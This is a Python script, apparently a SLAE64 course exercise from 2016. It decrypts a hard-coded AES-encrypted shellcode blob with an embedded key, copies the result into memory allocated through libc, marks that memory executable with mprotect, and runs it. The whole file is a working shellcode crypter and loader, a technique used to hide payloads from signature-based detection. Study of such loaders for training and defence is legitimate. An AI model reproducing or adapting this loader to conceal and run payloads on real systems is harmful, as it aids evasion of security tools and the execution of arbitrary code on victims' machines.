#!/usr/bin/env python

####################################################
#
# shellcode-decrypter.py
# by Michael Born (@blu3gl0w13)
# Student ID: SLAE64-1439
# November 8, 2016
#
####################################################

# Imports

from Crypto.Cipher import AES
import sys
#import argparse
import os
import hashlib
from ctypes import *


#---------------------------------------
#
# Define our Decryption Functions
#
#--------------------------------------


def aesDecrypter(key, IV, shellcode, salt):
  hashedKey = hashlib.sha256(key + salt).digest()
  mode = AES.MODE_CBC
  initVector = IV
  decrypterObject = AES.new(hashedKey, AES.MODE_CBC, initVector)
  messageToDecrypt = shellcode
  clearText = decrypterObject.decrypt(messageToDecrypt)
  #print "\n\n[+] RAW AES Decrypted Shellcode (non hex encoded): \n\"%s\"\n\n" % clearText
  return clearText
  sys.exit(0)

def pwn():
  # Setup the argument parser

#  parser = argparse.ArgumentParser()
#  parser.add_argument("-s", "--shellcode", help="Shellcode to encrypt", dest='shellcode', required=True)
#  parser.add_argument('-k', '--key', help='AES key to use for encryption', dest='key', required=True)
#  options = parser.parse_args()


  # Prepare some objects


  encryptedPayload =  "\x9a\x65\x3d\x92\xff\x57\x75\x21\x99\xf0\xed\xc5\xf0\x37\x48\x05\x9c\xe8\xa4\xed\xd7\x31\xbe\x3f\x20\xfe\xf5\x3c\xc0\x70\x86\x9f\x33\x65\x41\xe9\x1d\x24\xb2\x7e\x28\x95\x7e\x35\x18\x25\x0f\xc3\x40\x9d\x2f\xae\xae\xb0\x36\x60\xf0\x11\x28\xbe\xfa\xa7\x36\xc1"

#  encryptedPayload = (options.shellcode).replace("\\x", "").decode('hex')
  IV = encryptedPayload[:16]
  salt = encryptedPayload[16:32]
  key = 'clubjk'
  shellcode = encryptedPayload[32::]

  decrypted = aesDecrypter(key, IV, shellcode, salt)


  # now we need to run our shellcode from here

  # use ctypes.CDLL to load /lib/i386-linux-gnu/libc.so.6

  libC = CDLL('libc.so.6')

  #print decrypted
#  shellcode = str(decrypted)
#  shellcode = shellcode.replace('\\x', '').decode('hex')


#  code = c_char_p(shellcode)

  code = c_char_p(decrypted)
#  sizeOfDecryptedShellcode = len(shellcode)
  sizeOfDecryptedShellcode = len(decrypted)

  # now we need to setup our void *valloc(size_t size) and get our pointer to allocated memory

  memAddrPointer = c_void_p(libC.valloc(sizeOfDecryptedShellcode))

  # now we need to move our code into memory using memmove 
  # void *memmove(void *dest, const void *src, size_t n)

  codeMovePointer = memmove(memAddrPointer, code, sizeOfDecryptedShellcode)


  # now we use mprotect to make sure we have read, write, and execute permisions in memory
  # R, WR, X = 0x7

  protectMemory = libC.mprotect(memAddrPointer, sizeOfDecryptedShellcode, 7)
#  print protectMemory

  # now we set up a quick execution for our shellcode using cast ctypes.cast = cast(obj, typ)
  # we'll have to call ctypes.CFUNCTYPE to identify memAddrPointer as void * (c_void_p) type

  executeIt = cast(memAddrPointer, CFUNCTYPE(c_void_p))
#  print run
  executeIt()



if __name__ == "__main__":
  pwn()
